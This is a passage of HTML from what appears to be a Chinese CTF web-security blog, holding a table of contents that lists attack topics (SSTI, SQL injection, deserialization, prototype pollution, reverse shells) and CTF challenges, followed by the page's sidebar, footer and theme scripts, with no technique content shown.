href="#3-%E9%80%9A%E8%BF%87-htaccess%E6%88%96%E8%80%85user-ini%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.12.3.</span> <span class="toc-text">(3)通过.htaccess或者user.ini进行文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%90%8D%E4%BC%A0%E9%A9%AC"><span class="toc-number">1.12.4.</span> <span class="toc-text">(4)通过文件名传马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.13.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">1.13.1.</span> <span class="toc-text">(1)原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Bypass"><span class="toc-number">1.13.2.</span> <span class="toc-text">(2)Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%A4%E4%B8%AA%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.13.2.1.</span> <span class="toc-text">过滤了两个大括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.13.2.2.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="toc-number">1.13.2.3.</span> <span class="toc-text">过滤了 .</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#request-args%E9%80%83%E9%80%B8"><span class="toc-number">1.13.3.</span> <span class="toc-text">request.args逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-1"><span class="toc-number">1.13.3.1.</span> <span class="toc-text">过滤了 []</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-config"><span class="toc-number">1.13.3.2.</span> <span class="toc-text">过滤了 config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-init"><span class="toc-number">1.13.3.3.</span> <span class="toc-text">过滤了__init__</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86os"><span class="toc-number">1.13.3.4.</span> <span class="toc-text">过滤了os</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%BF%87%E6%BB%A4"><span class="toc-number">1.13.3.5.</span> <span class="toc-text">编码过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%88%9E-%E4%B8%80%E4%BA%9B%E9%AB%98%E7%AB%AF%E7%9A%84"><span class="toc-number">1.13.4.</span> <span class="toc-text">(∞)一些高端的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB-Undefined"><span class="toc-number">1.13.4.1.</span> <span class="toc-text">内置类 Undefined</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.13.4.2.</span> <span class="toc-text">过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#set"><span class="toc-number">1.13.4.2.1.</span> <span class="toc-text">set</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#attr"><span class="toc-number">1.13.4.2.2.</span> <span class="toc-text">attr()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lipsum"><span class="toc-number">1.13.4.3.</span> <span class="toc-text">lipsum</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url-for%E3%80%81get-flashed-messages"><span class="toc-number">1.13.4.4.</span> <span class="toc-text">url_for、get_flashed_messages</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bytes"><span class="toc-number">1.13.4.5.</span> <span class="toc-text">bytes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%87%E5%A6%99%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.13.4.6.</span> <span class="toc-text">奇妙的思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%88%9E-%E4%B8%80%E4%BA%9B%E4%B8%8D%E7%94%A8%E5%8A%A8%E8%84%91%E7%9A%84"><span class="toc-number">1.13.5.</span> <span class="toc-text">(∞)一些不用动脑的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9F%BA%E7%A1%80%E4%BE%8B%E9%A2%98"><span class="toc-number">1.13.6.</span> <span class="toc-text">(3)基础例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RUST%E4%B8%8B%E7%9A%84SSTI"><span class="toc-number">1.13.6.1.</span> <span class="toc-text">RUST下的SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HNCTF-2022-WEEK2-ez-SSTI-NSSCTF"><span class="toc-number">1.13.6.2.</span> <span class="toc-text">[HNCTF 2022 WEEK2]ez_SSTI | NSSCTF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%BC%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">1.13.7.</span> <span class="toc-text">(4)综合绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-python-template-injection"><span class="toc-number">1.13.7.1.</span> <span class="toc-text">攻防世界 Web_python_template_injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LitCTF-2025-%E6%98%9F%E6%84%BF%E4%BF%A1%E7%AE%B1-NSSCTF"><span class="toc-number">1.13.7.2.</span> <span class="toc-text">LitCTF 2025]星愿信箱 | NSSCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL"><span class="toc-number">1.14.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.14.1.</span> <span class="toc-text">(1)联合查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-NewsCenter"><span class="toc-number">1.14.1.1.</span> <span class="toc-text">攻防世界 NewsCenter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL-Baby-SQL%EF%BC%88%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.14.1.2.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[极客大挑战 2019]BabySQL) Baby SQL（双写绕过）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql-EZ-sql%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.14.1.3.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]ez_sql) EZ_sql（大小写绕过）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.14.2.</span> <span class="toc-text">(2)时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.14.3.</span> <span class="toc-text">(3)布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="toc-number">1.14.3.1.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[CISCN2019 华北赛区 Day2 Web1]Hack World)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXS"><span class="toc-number">1.15.</span> <span class="toc-text">XXS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.15.1.</span> <span class="toc-text">(1)存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">1.15.2.</span> <span class="toc-text">(2)反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DOM%E5%9E%8B"><span class="toc-number">1.15.3.</span> <span class="toc-text">(3)DOM型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E5%92%8CSSRF"><span class="toc-number">1.16.</span> <span class="toc-text">XXE和SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.16.1.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-number">1.17.</span> <span class="toc-text">目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.18.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%88%9E-%E5%8E%9F%E7%90%86"><span class="toc-number">1.18.1.</span> <span class="toc-text">(∞)原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0"><span class="toc-number">1.18.2.</span> <span class="toc-text">(1)一些函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-number">1.18.2.1.</span> <span class="toc-text">__wakeup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#construct"><span class="toc-number">1.18.2.2.</span> <span class="toc-text">__construct</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-number">1.18.2.3.</span> <span class="toc-text">__destruct</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-number">1.18.2.4.</span> <span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-set"><span class="toc-number">1.18.2.5.</span> <span class="toc-text">get(),set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-number">1.18.2.6.</span> <span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-number">1.18.2.7.</span> <span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.18.2.8.</span> <span class="toc-text">__toString()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-php%E4%B8%80%E8%88%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.18.3.</span> <span class="toc-text">(2)php一般反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web-php-unserialize"><span class="toc-number">1.18.3.1.</span> <span class="toc-text">攻防世界 Web_php_unserialize</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-php-Pop%E9%93%BE"><span class="toc-number">1.18.4.</span> <span class="toc-text">(3)php-Pop链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ISCC2025%E5%8C%BA%E5%9F%9F%E8%B5%9B-%E6%83%B3%E7%8A%AF%E5%A4%A7%E5%90%B4%E7%96%86%E5%9C%9F%E5%90%97"><span class="toc-number">1.18.4.1.</span> <span class="toc-text">ISCC2025区域赛 想犯大吴疆土吗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LitCTF-2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF-NSSCTF"><span class="toc-number">1.18.4.2.</span> <span class="toc-text">[LitCTF 2025]君の名は | NSSCTF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.18.5.</span> <span class="toc-text">(4)Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-ezphar"><span class="toc-number">1.18.5.1.</span> <span class="toc-text">1.ezphar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-bypass"><span class="toc-number">1.18.5.2.</span> <span class="toc-text">2.bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#NSSRound-4-SWPU-1zweb-NSSCTF"><span class="toc-number">1.18.5.2.1.</span> <span class="toc-text">[NSSRound#4 SWPU]1zweb | NSSCTF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6"><span class="toc-number">1.18.6.</span> <span class="toc-text">(5)GC回收机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.18.7.</span> <span class="toc-text">(6)Pickle反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.18.7.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.18.7.2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.18.7.2.1.</span> <span class="toc-text">python对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.18.7.2.2.</span> <span class="toc-text">Python面向对象</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.18.7.2.3.</span> <span class="toc-text">序列化和反序列化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.18.7.2.4.</span> <span class="toc-text">关于序列化和反序列化的函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.18.7.2.5.</span> <span class="toc-text">python魔术方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%88"><span class="toc-number">1.18.7.2.6.</span> <span class="toc-text">栈</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPVM"><span class="toc-number">1.18.7.2.7.</span> <span class="toc-text">什么是PVM</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">1.18.7.3.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.18.7.4.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F"><span class="toc-number">1.18.7.4.1.</span> <span class="toc-text">覆盖变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RCE-1"><span class="toc-number">1.18.7.4.2.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.18.7.4.3.</span> <span class="toc-text">实例化对象</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.18.7.5.</span> <span class="toc-text">例题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.19.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.20.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSleaks"><span class="toc-number">1.21.</span> <span class="toc-text">XSleaks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.22.</span> <span class="toc-text">原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.22.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.22.1.1.</span> <span class="toc-text">Python原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90%EF%BC%88%E7%BB%8F%E5%85%B8%E4%BE%8B%E5%AD%90%EF%BC%89"><span class="toc-number">1.22.1.1.1.</span> <span class="toc-text">污染分析（经典例子）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.22.1.1.2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.22.1.1.2.1.</span> <span class="toc-text">获取全局变量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.22.1.1.2.2.</span> <span class="toc-text">sys模块加载</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8loader%E8%8E%B7%E5%8F%96"><span class="toc-number">1.22.1.1.2.3.</span> <span class="toc-text">加载器loader获取</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.22.1.1.2.4.</span> <span class="toc-text">形参默认值替换</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#got-first-request%EF%BC%9A"><span class="toc-number">1.22.1.1.2.5.</span> <span class="toc-text">_got_first_request：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#static-url-path"><span class="toc-number">1.22.1.1.2.6.</span> <span class="toc-text">_static_url_path:</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#os-path-pardir"><span class="toc-number">1.22.1.1.2.7.</span> <span class="toc-text">os.path.pardir:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.22.1.2.</span> <span class="toc-text">JavaScript原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-proto-%E8%AE%BF%E9%97%AE"><span class="toc-number">1.22.1.2.1.</span> <span class="toc-text">利用__proto__访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-1"><span class="toc-number">1.22.1.2.2.</span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Json%E8%BE%93%E5%85%A5%E9%80%A0%E6%88%90%E6%B1%A1%E6%9F%93"><span class="toc-number">1.22.1.2.3.</span> <span class="toc-text">Json输入造成污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E4%BA%86-proto-%E7%9A%84%E6%B1%A1%E6%9F%93"><span class="toc-number">1.22.1.2.4.</span> <span class="toc-text">绕过过滤了__proto__的污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PS"><span class="toc-number">1.22.1.2.5.</span> <span class="toc-text">PS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">1.22.2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#NCTF2024-ez-dash"><span class="toc-number">1.22.2.1.</span> <span class="toc-text">NCTF2024 ez_dash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mini-L-CTF-2025-%E8%A5%BF%E7%94%B5-CTF-%E7%BB%88%E7%AB%AF-Clickclick"><span class="toc-number">1.22.2.2.</span> <span class="toc-text">Mini L-CTF 2025 - 西电 CTF 终端 Clickclick</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-OtenkiGirl-OtenkiGirl"><span class="toc-number">1.22.2.3.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[NewStarCTF 2023 公开赛道]OtenkiGirl) OtenkiGirl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LitCTF-2025-%E5%A4%9A%E9%87%8D%E5%AE%87%E5%AE%99%E6%97%A5%E8%AE%B0-NSSCTF"><span class="toc-number">1.22.2.4.</span> <span class="toc-text">[LitCTF 2025]多重宇宙日记 | NSSCTF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BUUCTF%E5%9C%A8%E7%BA%BF%E8%AF%84%E6%B5%8B-https-buuoj-cn-challenges-DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-EzFlask-EzFlask"><span class="toc-number">1.22.2.5.</span> <span class="toc-text">[BUUCTF在线评测](https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges#[DASCTF 2023 &amp; 0X401七月暑期挑战赛]EzFlask) EzFlask</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/02/D-3CTF2025-Web%E5%A4%8D%E7%8E%B0/" title="D^3CTF2025 Web复现">D^3CTF2025 Web复现</a><time datetime="2025-06-02T15:08:49.000Z" title="发表于 2025-06-02 23:08:49">2025-06-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/" title="Web基础">Web基础</a><time datetime="2025-05-31T09:21:08.000Z" title="发表于 2025-05-31 17:21:08">2025-05-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/25/LitCTF2025-WP-%E5%A4%8D%E7%8E%B0/" title="LitCTF2025 WP&amp;复现">LitCTF2025 WP&amp;复现</a><time datetime="2025-05-25T08:09:01.000Z" title="发表于 2025-05-25 16:09:01">2025-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/18/%E7%AC%AC%E4%BA%8C%E5%B1%8AParloo%E6%9D%AFWeb-%E9%99%A4%E4%BA%860%E8%A7%A3%E4%B9%8B%E5%A4%96%E7%9A%84Wp/" title="第二届Parloo杯Web 除了0解之外的Wp">第二届Parloo杯Web 除了0解之外的Wp</a><time datetime="2025-05-18T13:30:59.000Z" title="发表于 2025-05-18 21:30:59">2025-05-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/17/Pearcmd-php%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="Pearcmd.php本地文件上传">Pearcmd.php本地文件上传</a><time datetime="2025-05-17T04:34:58.000Z" title="发表于 2025-05-17 12:34:58">2025-05-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Pure Stream</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.0-b3"></script><script src="/js/main.js?v=5.3.0-b3"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
